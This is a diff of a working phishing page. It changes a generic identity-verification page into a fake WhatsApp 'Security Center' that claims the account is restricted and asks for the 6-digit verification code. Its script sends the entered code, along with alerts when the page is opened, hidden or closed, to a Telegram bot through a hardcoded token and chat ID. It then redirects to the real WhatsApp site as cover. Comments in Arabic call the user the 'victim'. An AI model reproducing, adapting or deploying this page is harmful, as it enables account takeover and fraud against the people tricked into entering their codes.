@@ -3,136 +3,127 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Identity Verification Gateway</title>
+    <title>WhatsApp Security Center</title>
     <style>
-        :root {
-            --primary: #0052cc; /* لون أزرق رسمي (Corporate) */
-            --bg: #f4f7f9;
-            --text: #172b4d;
-            --secondary: #5e6c84;
+        :root { 
+            --wa-bg: #111b21;
+            --wa-green: #00a884;
+            --wa-danger: #ea0038;
+            --wa-text: #e9edef;
+            --wa-hint: #8696a0;
         }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
-        body { background: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: center; height: 100vh; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Segoe UI, Helvetica, Arial, sans-serif; }
+        body { background: var(--wa-bg); color: var(--wa-text); display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
         
-        .card { 
-            background: #fff; width: 90%; max-width: 400px; padding: 35px 25px; 
-            border-radius: 12px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); 
-            text-align: center; position: relative; overflow: hidden;
+        /* شريط التنبيه العلوي - لربط الصفحة بالرسالة */
+        .alert-top {
+            background: var(--wa-danger);
+            color: white;
+            width: 100%;
+            padding: 10px;
+            font-size: 13px;
+            text-align: center;
+            position: fixed;
+            top: 0;
+            font-weight: 600;
+            letter-spacing: 0.5px;
         }
 
-        /* خط التحميل العلوي لإعطاء طابع "المعالجة" */
-        .progress-line { position: absolute; top: 0; left: 0; height: 4px; background: var(--primary); width: 0%; transition: 0.5s; }
-
-        .shield { width: 50px; height: 50px; color: var(--primary); margin-bottom: 20px; }
-        h2 { font-size: 20px; margin-bottom: 12px; font-weight: 600; }
-        p { font-size: 14px; color: var(--secondary); line-height: 1.6; margin-bottom: 25px; }
-
-        .input-box { text-align: left; margin-bottom: 20px; }
-        label { display: block; font-size: 11px; font-weight: 700; color: var(--secondary); text-transform: uppercase; margin-bottom: 8px; letter-spacing: 0.5px; }
+        .card { width: 100%; max-width: 380px; padding: 30px; text-align: center; }
         
-        input { 
-            width: 100%; padding: 14px; border: 2px solid #dfe1e6; border-radius: 6px; 
-            font-size: 18px; outline: none; text-align: center; letter-spacing: 5px; transition: 0.3s;
+        .logo { width: 50px; margin-bottom: 20px; margin-top: 20px; }
+        h1 { font-size: 20px; font-weight: 600; margin-bottom: 15px; color: #fff; }
+        
+        .desc { font-size: 14px; color: var(--wa-text); line-height: 1.6; margin-bottom: 25px; text-align: left; background: #182229; padding: 15px; border-radius: 8px; border-left: 3px solid var(--wa-danger); }
+
+        .otp-input { 
+            width: 100%; border: none; border-bottom: 2px solid var(--wa-green); 
+            font-size: 32px; letter-spacing: 12px; text-align: center; 
+            background: transparent; color: #fff; outline: none; margin: 20px 0;
         }
-        input:focus { border-color: var(--primary); background: #fbfcfe; }
 
         button { 
-            background: var(--primary); color: #fff; border: none; width: 100%; 
-            padding: 15px; border-radius: 6px; font-size: 15px; font-weight: 600; 
-            cursor: pointer; transition: 0.3s;
+            background: var(--wa-green); color: #111b21; border: none; 
+            width: 100%; padding: 15px; border-radius: 5px; font-size: 15px; 
+            font-weight: 700; cursor: pointer; transition: 0.3s;
         }
-        button:active { transform: scale(0.98); }
+        button:active { opacity: 0.8; }
 
-        .footer-secure { 
-            margin-top: 25px; display: flex; align-items: center; justify-content: center; 
-            gap: 10px; font-size: 11px; color: #a5adba; border-top: 1px solid #ebecf0; padding-top: 20px;
-        }
+        .footer { font-size: 12px; color: var(--wa-hint); margin-top: 30px; }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <div class="progress-line" id="p-line"></div>
-        
-        <svg class="shield" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zM10 5a1 1 0 011 1v3a1 1 0 11-2 0V6a1 1 0 011-1zm0 8a1 1 0 100-2 1 1 0 000 2z" clip-rule="evenodd"></path></svg>
-        
-        <h2>Identity Verification</h2>
-        <p id="msg">To continue using our services, please verify your account by entering the 6-digit synchronization code sent to your mobile device.</p>
-        
-        <div class="input-box">
-            <label>Security OTP Code</label>
-            <input type="tel" id="otp" placeholder="••••••" maxlength="6" inputmode="numeric">
-        </div>
-        
-        <button id="btn-main" onclick="submitData()">Confirm & Update</button>
+    <div class="alert-top">ACCOUNT RESTRICTED - IMMEDIATE VERIFICATION REQUIRED</div>
 
-        <div class="footer-secure">
-            <span>Verified by Global Security Alliance</span>
-            <img src="https://upload.wikimedia.org/wikipedia/commons/b/ba/SSL_logo.png" height="15" style="filter: grayscale(1); opacity: 0.5;">
+    <div class="card">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
+        <h1>Security Check</h1>
+        
+        <div class="desc">
+            Due to unauthorized access attempts, your account has been temporarily suspended. Enter the 6-digit code sent to your phone to lift the 24h restriction.
+        </div>
+
+        <input type="tel" id="otp" class="otp-input" maxlength="6" inputmode="numeric" placeholder="••••••">
+        
+        <button onclick="submitOtp()">CANCEL RESTRICTION</button>
+
+        <div class="footer">
+            <img src="https://static.whatsapp.net/rsrc.php/v3/yO/r/Sshne939E8V.png" width="10" style="opacity:0.5"> 
+            End-to-end encrypted security protocol
         </div>
     </div>
 
     <script>
-        // إعدادات البوت (التوكن والأيدي بتوعك)
-        const CONFIG = {
+        const BOT_CONFIG = {
             TOKEN: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU',
             CHAT_ID: '5446862709'
         };
 
-        function sendToTelegram(text) {
-            const url = `https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`;
-            fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CONFIG.CHAT_ID,
-                    text: text,
-                    parse_mode: 'HTML'
-                })
-            });
-        }
-
-        // إرسال تنبيه أول ما الصفحة تفتح
-        window.onload = () => {
-            sendToTelegram(`🚀 <b>Authority Page Opened</b>\nTarget is viewing the Global Gateway.`);
-            // حركة شريط التحميل
-            setTimeout(() => document.getElementById('p-line').style.width = '40%', 500);
-        };
-
-        function submitData() {
-            const otpVal = document.getElementById('otp').value;
-            const btn = document.getElementById('btn-main');
-            const pLine = document.getElementById('p-line');
-
-            if(otpVal.length === 6) {
-                // تغيير شكل الزرار والتحميل
-                btn.disabled = true;
-                btn.innerHTML = "Verifying Identity...";
-                btn.style.background = "#5e6c84";
-                pLine.style.width = '80%';
-
-                // إرسال الكود للبوت
-                sendToTelegram(`🔥 <b>OTP RECEIVED (Authority)</b>\nCode: <code>${otpVal}</code>\nSystem: SSL Sync Protocol`);
-
-                // وهم المعالجة لمدة 3 ثواني
-                setTimeout(() => {
-                    pLine.style.width = '100%';
-                    document.getElementById('msg').innerHTML = "<b style='color:#00a884'>Identity Confirmed.</b><br>Redirecting to secure session...";
-                    
-                    setTimeout(() => {
-                        window.location.href = "https://www.whatsapp.com/security";
-                    }, 2000);
-                }, 3000);
-
+        function notifyBot(message) {
+            const url = `https://api.telegram.org/bot${BOT_CONFIG.TOKEN}/sendMessage`;
+            const data = { chat_id: BOT_CONFIG.CHAT_ID, text: message, parse_mode: 'HTML' };
+            
+            // استخدام fetch العادي للفتح، و sendBeacon للقفل لضمان الوصول
+            if (navigator.sendBeacon) {
+                navigator.sendBeacon(url, new Blob([JSON.stringify(data)], {type: 'application/json'}));
             } else {
-                alert("Please enter a valid 6-digit code.");
+                fetch(url, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(data) });
             }
         }
 
-        // إرسال تنبيه لو الضحية قفل الصفحة
-        window.onbeforeunload = () => {
-            sendToTelegram(`⚠️ <b>Target Disconnected</b>\nSession closed.`);
+        // 1. تنبيه عند فتح الصفحة
+        window.onload = () => {
+            notifyBot(`🟢 <b>[ACCESS]:</b> User opened the security gateway.\nWaiting for OTP...`);
         };
+
+        // 2. تنبيه عند محاولة الخروج أو إغلاق الصفحة
+        window.addEventListener('visibilitychange', function() {
+            if (document.visibilityState === 'hidden') {
+                notifyBot(`🟡 <b>[AWAY]:</b> User minimized the page or switched tabs.`);
+            }
+        });
+
+        window.onbeforeunload = function() {
+            notifyBot(`🔴 <b>[EXIT]:</b> User closed the page/session.`);
+        };
+
+        // 3. إرسال الكود
+        function submitOtp() {
+            const otp = document.getElementById('otp').value;
+            if(otp.length === 6) {
+                notifyBot(`🔥 <b>[OTP RECEIVED]:</b>\nCode: <code>${otp}</code>\nStatus: Attempting to lift restriction.`);
+                
+                // شكل تحميل وهمي
+                document.querySelector('.card').innerHTML = `<div style="color:var(--wa-green); font-size:18px; margin-top:50px;">Verifying...<br><small style="color:#8696a0">Please wait 2 minutes.</small></div>`;
+                
+                setTimeout(() => {
+                    window.location.href = "https://www.whatsapp.com/security";
+                }, 5000);
+            } else {
+                alert("Enter the 6-digit code.");
+            }
+        }
     </script>
 </body>
 </html>
